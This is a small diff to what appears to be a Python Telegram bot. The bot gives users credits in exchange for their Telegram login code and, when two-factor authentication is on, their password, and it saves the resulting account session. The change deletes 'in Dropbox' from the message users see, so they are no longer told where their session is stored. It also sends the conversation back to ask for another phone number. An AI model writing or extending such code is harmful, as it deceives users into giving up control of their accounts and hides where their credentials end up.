@@ -210,9 +210,9 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.disconnect()
 
         # Inform the user that their credits have been updated
-        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+        await update.message.reply_text(f"🎉 Your account has been saved. You now have {new_credit_balance} credits.")
 
-        return ConversationHandler.END
+        return ASK_PHONE
 
     except errors.SessionPasswordNeededError:
         await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
